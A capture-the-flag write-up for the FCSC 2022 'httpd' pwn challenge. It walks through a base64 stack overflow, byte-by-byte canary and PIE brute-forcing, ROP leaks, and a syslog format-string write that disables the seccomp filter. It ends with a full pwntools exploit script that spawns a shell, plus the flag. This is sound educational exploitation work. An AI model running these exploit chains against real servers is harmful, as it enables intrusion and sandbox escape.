# httpd

**httpd** was a pwn challenge from FCSC 2022, of *hard* difficulty.

We were asked to exploit a sandboxed HTTP server given the binary and the sources.

## TL;DR

1. Stack buffer overflow in HTTP header
2. Leak canary, PIE, libc and shared memory pointer
3. Write second stage payload to shared memory
4. Format string bug in parent process allows to rewrite its own memory
5. Rewrite seccomp filter to cancel out the sandbox
6. ret2libc in child process

## Preliminary recon

Naively, we try accessing the web server directly from our browser, and are greeted with a login window.

![Login window](./1.png)

Filling in `admin:admin` grants us authentication, but only displays the following message: *Congratulations! Now get the flag.*

Let's check out the files we're given.

<pre style="background:rgba(20,20,40,0.9)">
<span style="color:#fff">╭─</span><b><span style="color:#67F86F">face@0xff</span></b><span style="color:#fff"> </span><b><span style="color:#6A76FB">~/ctf/fcsc/pwn/httpd </span></b><span style="color:#fff">                                                                </span>
<span style="color:#fff">╰─</span><b><span style="color:#fff">$</span></b><span style="color:#fff"> checksec httpd                                                                               </span>
<span style="color:#fff">[</span><b><span style="color:#6A76FB">*</span></b><span style="color:#fff">] '/home/face/ctf/fcsc/pwn/httpd/httpd'                                                        </span>
<span style="color:#fff">    Arch:     amd64-64-little                                                                    </span>
<span style="color:#fff">    RELRO:    </span><span style="color:#1DC121">Full RELRO</span><span style="color:#fff">                                                                         </span>
<span style="color:#fff">    Stack:    </span><span style="color:#1DC121">Canary found</span><span style="color:#fff">                                                                       </span>
<span style="color:#fff">    NX:       </span><span style="color:#1DC121">NX enabled</span><span style="color:#fff">                                                                         </span>
<span style="color:#fff">    PIE:      </span><span style="color:#1DC121">PIE enabled</span><span style="color:#fff">  </span>
</pre>

Lots of protections, but there's even more to come.

The sources of the challenge consist of several files:

<pre style="background:rgba(20,20,40,0.9)">
<span style="color:#fff">╭─</span><b><span style="color:#67F86F">face@0xff</span></b><span style="color:#fff"> </span><b><span style="color:#6A76FB">~/ctf/fcsc/pwn/httpd </span></b><span style="color:#fff">                                                                </span>
<span style="color:#fff">╰─</span><b><span style="color:#fff">$</span></b><span style="color:#fff"> tree src                                                                                     </span>
<b><span style="color:#6A76FB">src</span></b><span style="color:#fff">                                                                                              </span>
<span style="color:#fff">├── audit.c                                                                                      </span>
<span style="color:#fff">├── audit.h                                                                                      </span>
<span style="color:#fff">├── base64.c                                                                                     </span>
<span style="color:#fff">├── base64.h                                                                                     </span>
<span style="color:#fff">├── debug.h                                                                                      </span>
<span style="color:#fff">├── filter.bpf                                                                                   </span>
<span style="color:#fff">├── filter.i                                                                                     </span>
<span style="color:#fff">├── http.c                                                                                       </span>
<span style="color:#fff">├── httpd.c                                                                                      </span>
<span style="color:#fff">├── http.h                                                                                       </span>
<span style="color:#fff">├── Makefile                                                                                     </span>
<span style="color:#fff">├── worker.c                                                                                     </span>
<span style="color:#fff">└── worker.h </span>
</pre>

The main file, `httpd.c`, implements a fork server after mapping a shared memory page:

```c
/* Prepare shared memory segment */
struct shared *shared = mmap(NULL, sizeof(*shared),
  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

if(MAP_FAILED == shared) {
  perror("mmap");
  return EXIT_FAILURE;
}

/* Main loop */
do {
  int status = request(shared);
  DEBUG("status = %d\n", status);
  audit(shared, status);
} while(shared->keepalive);
```

The `request` function forks the process and launches a *sandbox* in the child process, inside of which the HTTP requests will be processed.

The `filter.bpf` file catches our attention. It implements a BPF filter:

```c
/* Check architecture */
ld [4]
jneq #0xc000003e, kill /* AUDIT_ARCH_X86_64 */

/* Check syscall */
ld [0]

/* These 4 syscalls are allowed by SECCOMP_SET_MODE_STRICT */
jeq #0,   allow  /* SYS_read */
jeq #1,   allow  /* SYS_write */
jeq #15,  allow  /* SYS_sigreturn */
jeq #60,  allow  /* SYS_exit */

jeq #12,  allow  /* SYS_brk */

kill:  ret #0x80000000 /* SECCOMP_RET_KILL_PROCESS */
allow: ret #0x7FFF0000 /* SECCOMP_RET_ALLOW */
```

This filter is effectively enforced by the sandbox, thanks to *seccomp*:

```c
static struct sock_filter filter[] = {
  #include "filter.i"
};

static struct sock_fprog bpf = {
  .filter = filter,
  .len    = sizeof(filter) / sizeof(*filter),
};

if(0 != prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
  perror("prctl PR_SET_NO_NEWPRIVS");
  exit(EXIT_FAILURE);
}

if(0 != seccomp(SECCOMP_SET_MODE_FILTER, 0, &bpf)) {
  perror("seccomp");
  exit(EXIT_FAILURE);
}
```

This means that the child processes are only allowed to use a very select number of syscalls. With these syscalls, even if we manage to exploit a child process, we won't be able to get a shell or read a file. It also seems the BPF filter does not bear any specific weakness.

## Auditing the sources: a first vulnerability

Next step is to audit the sources to identify potential vulnerabilities.

We quickly find a problem in `worker.c`. The following function, `checkAuth`, takes as input the base64 string that is sent through the `Authorization` HTTP header (e.g. `"Authorization
	Basic YWRtaW46YWRtaW4="`).

```c
bool checkAuth(const char *b64, struct shared *shared)
{
	char creds[0x100] = {};

	if(true != b64_decode(b64, strlen(b64), creds)) {
		askAuth("Malformed base64");
		return false;
	}

	DEBUG("creds = %s\n", creds);

	/* Parse creds */
	char *saveptr;
	const char *login    = strtok_r(creds, ":", &saveptr);
	const char *password = strtok_r(NULL,  "",  &saveptr);

	/* Check login */
	if(0 != strcmp(login, LOGIN)) {
		askAuth("Invalid username");
		return false;
	}

	/* Check password */
	if(0 != strcmp(password, PASSWORD)) {
		askAuth("Invalid password");
		return false;
	}

	/* We're all set, keep track of the user */
	strncpy(shared->username, login, sizeof(shared->username));
	shared->loggedin = true;

	return true;
}
```

It appears the `b64_decode` function writes the decoded base64 buffer directly to `creds` without performing any length check for as long as there are bytes to decode. Also a determinant fact is that **no null byte** is appended to the decoded base64 string. This accounts for a **stack-based buffer overflow** in the `checkAuth` method.

We can trigger the bug by sending a request that looks like this. Note that each line feed should be preceded by a carriage return (`\r\n`).

```
GET / HTTP/1.1
Connection: keep-alive
Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=
Content-Length: 0

```

## Exploiting the buffer overflow

### Leaking canary and PIE

We cannot directly overwrite RIP as there is a canary protection. However, remember that no null byte is appended to our overflowing byte array in the stack. This means we can **brute-force the canary** one byte at a time:

```python
payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += bytes(canary + [guess])
```

Every time the server does not crash and we are successfully logged in, means we found a new correct byte.

It is also important to keep the connection alive (`Connection: keep-alive`) as the parent process will, in this case, loop and fork again to handle the next request. This way, the canary will stay the same across the forked processes.

Once we determined the 8 bytes of the canary, next thing we can do is brute-force the return address in order to leak the PIE base. This works pretty much the same way, although we can speed up the search because we know the return address ends in `0x89e` and its two most significant bytes are null.

### Leaking libc base

Now that we can overwrite RIP and know the PIE base, we can use a few gadgets from the binary and proceed to leak libc base. This will give us useful gadgets and functions for the next steps.

The idea is simply to use `ret2plt`: we will use the `puts` entry in the PLT so that the server leaks a pointer for us. In this case, we arbitrarily decide to leak `puts@got` which points to libc. As we are given the libc version, we can then calculate its base.

```python
payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788) # saved rbp
payload += p64(pie_base + 0x2aa3)  # pop rdi ; ret
payload += p64(binary.got["puts"])
payload += p64(binary.plt["puts"]) # leak puts@got
payload += p64(pie_base + 0x289e)  # try to return cleanly

# [...]

q = p.recvline()

puts_got = int.from_bytes(q.rstrip()[-6:], byteorder="little")
libc_base = puts_got - 0x809d0
libc.address = libc_base

print(f"libc base: 0x{libc_base:016x}")
```

Now... what should we do? We can run arbitrary ROP chains and have access to the whole libc, but we still can't do anything really promising because of the seccomp filter. Time to find something else.


## Second vulnerability in the parent process

In order to do anything really interesting such as popping a shell, we would have to escape from the sandbox, for instance by leveraging the parent process.

How can we reach the parent process? Well, recall the `main` function:

```c
/* Prepare shared memory segment */
struct shared *shared = mmap(NULL, sizeof(*shared),
  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

if(MAP_FAILED == shared) {
  perror("mmap");
  return EXIT_FAILURE;
}

/* Main loop */
do {
  int status = request(shared);
  DEBUG("status = %d\n", status);
  audit(shared, status);
} while(shared->keepalive);
```

There is a shared page of memory between the parent process and its children! Its structure is the following:

```c
struct shared {
	bool keepalive;
	bool loggedin;
	char username[0x100];
};
```

Then, this `shared` structure is used in the `audit` function, which serves for logging purposes.

```c
void audit(const struct shared *shared, int status)
{
	/* Do not log failed attempts, exit early */
	if(WIFEXITED(status) && !shared->loggedin)
		return;

	/* Initialize the logger */
	static bool init = false;

	if(!init) {
		openlog(IDENT, 0, LOG_DAEMON);
		init = true;
	}

	/* Determine the message and priority */
	char msg[0x200];
	int prio;

	if(WIFEXITED(status)) {
		/* Keep track of connections in the audit log */
		snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
		prio = LOG_NOTICE;
	} else if(WIFSIGNALED(status)) {
		/* Signal ? We should warn about this */
		snprintf(msg, sizeof(msg), "SIGNAL %d", WTERMSIG(status));
		prio = LOG_WARNING;
	} else {
		/* ??? */
		snprintf(msg, sizeof(msg), "UNKNOWN %d", status);
		prio = LOG_CRIT;
	}

	/* Send the actual message to the logger */
	syslog(prio, msg, 0);
}
```

At this point, I was tired and I incorrectly read the source, thinking there was yet another stack-based buffer overflow when the `LOGIN %s` string was copied to `msg` with our username (obviously there is not, since it stops at `sizeof(msg)`). Therefore, I spent a lot of time trying to manage to leak the shared memory pointer so that I could write an arbitrary second stage payload inside it, including null bytes.

Thanksfully, it didn't go to waste as getting such a primitive was still useful to exploit the actual vulnerability, which we will talk about now.

The vulnerability actually lies in the use of this function:

```c
/* Send the actual message to the logger */
syslog(prio, msg, 0);
```

The `syslog` function takes a **format string** as input, and we control the `msg` buffer because `shared->username` is copied in it (if we are logged in, i.e. `shared->loggedIn == 1`). This also requires that the child process returned cleanly (no crash).

### Leaking the shared memory pointer

Testing locally, I noticed the offset between the shared mmaped page and the libc base was constant. Therefore, I first finished my exploit by hardcoding this offset in my script.

Obviously, it turned out that this offset was completely wrong on the remote, certainly due to how the kernel manages memory differently.

I explored several methods to leak this pointer. In particular, I wasted a lot of time trying to leak it from the stack:
1. Leak stack pointer through `&environ` in libc
2. Calculate pointer to shared memory pointer in the stack
3. Leak shared memory pointer

Again, I didn't manage to make it work on the remote as I wasn't able to locate the pointer in the stack (which was, of course, at a different offset than locally).

Especially, my exploit was taking a painfully stupid time to run and I had to wait dozens of minutes each time to brute-force the canary and PIE. Indeed, I had to set a ~500ms timeout for every byte (and even then this was not necessarily enough as I often stumbled upon false positives). Therefore, debugging my exploit on the remote was excruciating.

![](3.jpg)

Next, I tried leaking the shared memory pointer directly with well-chosen gadgets. The `shared->username` pointer was in `rdi` at the end of the `checkAuth` function, so leaking `rdi` through a ropchain would be enough.

Again, I spent a lot of time trying to chain libc gadgets to move `rdi` to an interesting register (typically `rsi`, so that I can write to it through `read`, or leak it through some function like `printf`...), without success. I didn't immediately think of writing the register to memory (next time, I will know!). Eventually, I came up with this chain:

```python
payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)  # saved rbp
payload += p64(libc_base + 0x44c70) # pop rax ; ret
payload += p64(pie_base + 0x5000)   # random place in .data
payload += p64(libc_base + 0x9711f) # mov qword ptr [rax], rdi ; ret (rdi = shared->username)
payload += p64(pie_base + 0x2aa3)   # pop rdi ; ret
payload += p64(pie_base + 0x5001)
payload += p64(binary.plt["puts"])  # leak the pointer we just copied
payload += p64(pie_base + 0x289e)   # try to return cleanly
```

### Writing a second stage payload to the shared memory

This part is rather straightforward: return to `read@plt`.

```python
payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)      # saved rbp
payload += p64(pie_base + 0x2aa3)       # pop rdi ; ret
payload += p64(0x0)                     # fd: stdin
payload += p64(libc_base + 0x2a4cf)     # pop rsi ; ret
payload += p64(shared_memory_ptr)       # share->keepalive + logged_in + username
payload += p64(libc_base + 0xc7f32)     # pop rdx ; ret
payload += p64(0x300)                   # n
payload += p64(libc.sym["read"])
payload += p64(libc_base + 0x44c70)     # pop rax ; ret
payload += p64(0x0)
payload += p64(binary.sym["_exit"])     # _exit(status=0) to trigger correct path in audit (LOGIN syslog)
```

It is important to note that we want to exit the process cleanly to trigger the correct path in the `audit` function next time the parent process runs it. We use the `_exit` function defined in the binary that directly syscalls `exit` (the libc `exit` will not work with the seccomp filter).

After sending this payload, the server will ask for `0x300` bytes and we can overwrite the shared memory as we want.

### Exploiting the format string bug

We now fully control `shared->username`. As we saw earlier, this username is copied through the `msg` buffer in the `audit` function and used in `syslog`, leaving room for a format string type vulnerability.

With that, we can write an arbitrary value in the parent's process memory, but we are constrained to a payload without null byte (as the username is copied with `snprintf`). Therefore, it is better to use only a single write.

Without stack leak, my solution was to **rewrite the BPF filter** inside the parent memory so that the next forked child would use hijacked seccomp rules:

```python
payload = b""
payload += b"\x01\x01" # set logged_in=1 to trigger correct path
payload += b"AA" # align format string in stack
payload += br"%32759c%12$hnaaa" + p64(pie_base + 0x5066)
```

This format string writes the word `\xFF\x7F` at `pie_base + 0x5066`, which patches the BPF filter in this part so that it always returns `SECCOMP_RET_ALLOW`:

```c
kill:  ret #0x7FFF0000 /* SECCOMP_RET_ALLOW */
allow: ret #0x7FFF0000 /* SECCOMP_RET_ALLOW */
```

Of course, the `pie_base + 0x5066` address should not have a null byte in it (except for the most significant bytes), but this happens only very rarely. Right?

![](4.jpg)


## Final stage

Once the BPF filter has been hijacked, the server spawns a new child and a `ret2libc` concludes the challenge. For some reason it didn't work for me with `system` so I used `execve`.

```python
payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)            # saved rbp
payload += p64(pie_base + 0x2aa3)             # pop rdi ; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(pie_base + 0x2aa1)             # pop rsi ; pop r15 ; ret
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_base + 0xc7f32)           # pop rdx ; ret
payload += p64(0x0)
payload += p64(libc.sym["execve"])
```

![Example run of the final exploit](5.jpg)

As someone who's still relatively not at ease with pwn, I would like to thank the author of this challenge, which I found to be a fun ride with well designed steps.

## Exploit script

```python
from pwn import *
import base64
import time


binary = ELF("./httpd")
libc = ELF("./libc.so.6")

context.arch = "amd64"
context.bits = 64

if args.REMOTE:
    p = remote("challenges.france-cybersecurity-challenge.fr", 2058)
    TIMEOUT = 0.2
else:
    p = process(["./httpd_patched"])
    TIMEOUT = 0.1



# Leak canary

canary = [0x00]
while len(canary) < 8:
    found = False
    for guess in range(256):
        time.sleep(TIMEOUT)

        payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
        payload += bytes(canary + [guess])

        req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

        p.send(req)
        q = p.recvuntil(b"\r\n\r\n", timeout=TIMEOUT)
        if q and b'flag' in p.recv(4096):
            canary.append(guess)
            print(f"Canary: {bytes(canary).hex()}")
            found = True
            break
    if not found:
        canary = canary[:-1]

canary = int.from_bytes(bytes(canary), byteorder="little") 
print()



# Leak PIE (ret addr)

ret_addr = [0x9e]
while len(ret_addr) < 6:
    found = False
    for guess in range(256):
        if len(ret_addr) == 1 and guess % 16 != 8:
            continue # ret addr ends with 0x89e

        time.sleep(TIMEOUT)
        payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
        payload += p64(canary)
        payload += p64(0x1122334455667788) # saved rbp
        payload += bytes(ret_addr + [guess])

        req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

        p.send(req)
        q = p.recvuntil(b"\r\n\r\n", timeout=TIMEOUT)
        if q and b'flag' in p.recv(4096):
            ret_addr.append(guess)
            print(f"Return address: {bytes(ret_addr).hex()}")
            found = True
            break
    if not found:
        ret_addr = ret_addr[:-1]

ret_addr = int.from_bytes(bytes(ret_addr), byteorder="little")
pie_base = ret_addr - 0x289e

print(f"PIE base: 0x{pie_base:016x}\n")

binary.address = pie_base


# Ropchain to leak libc base

payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788) # saved rbp
payload += p64(pie_base + 0x2aa3)  # pop rdi ; ret
payload += p64(binary.got["puts"])
payload += p64(binary.plt["puts"]) # leak puts@got
payload += p64(pie_base + 0x289e)  # try to return cleanly

req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

p.send(req)
q = p.recvline()

puts_got = int.from_bytes(q.rstrip()[-6:], byteorder="little")
libc_base = puts_got - 0x809d0
libc.address = libc_base

print(f"libc base: 0x{libc_base:016x}")



# Ropchain to leak shared memory pointer

binary.address = pie_base

payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)  # saved rbp
payload += p64(libc_base + 0x44c70) # pop rax ; ret
payload += p64(pie_base + 0x5000)   # random place in .data
payload += p64(libc_base + 0x9711f) # mov qword ptr [rax], rdi ; ret (rdi = shared->username)
payload += p64(pie_base + 0x2aa3)   # pop rdi ; ret
payload += p64(pie_base + 0x5001)
payload += p64(binary.plt["puts"])  # leak the pointer we just copied
payload += p64(pie_base + 0x289e)   # try to return cleanly

req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

p.send(req)
q = p.recv(4096)

shared_memory_ptr = int.from_bytes(b"\x00" + q.rstrip()[-5:], byteorder="little") - 0x100

print(f"shared memory pointer: 0x{shared_memory_ptr:016x}")


# Ropchain that writes second stage payload to shared memory

payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)      # saved rbp
payload += p64(pie_base + 0x2aa3)       # pop rdi ; ret
payload += p64(0x0)                     # fd: stdin
payload += p64(libc_base + 0x2a4cf)     # pop rsi ; ret
payload += p64(shared_memory_ptr)       # share->keepalive + logged_in + username
payload += p64(libc_base + 0xc7f32)     # pop rdx ; ret
payload += p64(0x300)                   # n
payload += p64(libc.sym["read"])
payload += p64(libc_base + 0x44c70)     # pop rax ; ret
payload += p64(0x0)
payload += p64(binary.sym["_exit"])     # _exit(status=0) to trigger correct path in audit (LOGIN syslog)

req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

p.send(req)



# Exploit format string in parent process (audit->syslog)
# Rewrite seccomp BPF filter_0 to allow all syscalls (\x00\x80 -> \xFF\x7F ALLOW)

payload = b""
payload += b"\x01\x01" # set logged_in=1 to trigger correct path
payload += b"AA" # align format string in stack
payload += br"%32759c%12$hnaaa" + p64(pie_base + 0x5066)
print(payload)
while len(payload) < 0x300:
    payload += b"\x00"
p.send(payload)



# Finally, next fork will be seccomped with our hijacked BPF filter
# ret2libc our way to shell

payload = b"admin:admin\x00" + b"\x00" * (264 - 12)
payload += p64(canary)
payload += p64(0x1122334455667788)            # saved rbp
payload += p64(pie_base + 0x2aa3)             # pop rdi ; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(pie_base + 0x2aa1)             # pop rsi ; pop r15 ; ret
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_base + 0xc7f32)           # pop rdx ; ret
payload += p64(0x0)
payload += p64(libc.sym["execve"])

req = b"""GET / HTTP/1.1\r
Connection: keep-alive\r
Authorization: Basic REPLACE\r
Content-Length: 0\r
\r
""".replace(b"REPLACE", base64.b64encode(payload))

p.send(req)

p.interactive()

p.close()


"""
FCSC{d87c69143541ae0d3e43f8d65bff7072646cdc781167b89aedf0146cb20ed3cd}
"""

```
